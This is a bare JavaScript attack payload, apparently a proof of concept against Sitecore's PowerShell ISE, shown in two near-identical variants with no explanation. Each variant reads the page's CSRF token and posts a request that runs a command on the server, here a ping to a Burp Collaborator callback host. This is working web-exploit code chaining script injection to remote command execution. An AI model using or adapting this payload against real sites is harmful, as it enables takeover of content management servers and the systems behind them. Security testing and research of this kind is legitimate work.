var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN='+token+'&__VIEWSTATE=53FA2EB0484946FFAF434AC1946D5FEF&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20md3zgmlfptx9nyeladjwxhwe45axym.burpcollaborator.net')
};
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
    changeReq.send('&__PARAMETERS=pstaskmonitor%3Acheck&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN='+token+'&__VIEWSTATE=&scActiveRibbonStrip=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20md3zgmlfptx9nyeladjwxhwe45axym.burpcollaborator.net')
};
